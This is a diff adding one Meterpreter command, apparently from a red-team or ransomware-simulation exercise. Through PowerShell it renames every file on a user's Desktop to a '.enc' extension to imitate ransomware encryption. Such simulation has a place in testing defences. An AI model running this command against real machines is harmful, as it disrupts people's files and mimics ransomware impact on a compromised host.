@@ -1,0 +1,3 @@
+# Simulating encryption by changing file extensions to .enc in meterpreter session
+
+Powershell_execute "Get-ChildItem -Path C:\Users\mark\Desktop -File | ForEach-Object {Rename-Item -Path $_.FullName -NewName ($_.BaseName + '.enc')}"
